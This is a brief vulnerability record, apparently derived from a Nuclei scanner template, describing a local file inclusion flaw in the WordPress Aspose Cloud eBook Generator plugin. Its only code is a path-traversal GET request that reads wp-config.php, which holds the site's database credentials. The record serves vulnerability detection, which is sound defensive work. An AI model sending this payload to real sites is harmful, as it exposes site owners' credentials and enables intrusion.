# Vulnerability: Wordpress Aspose Cloud eBook Generator - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`aspose-file-download.yaml`)

## Description
Wordpress Aspose Cloud eBook Generator is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php
```

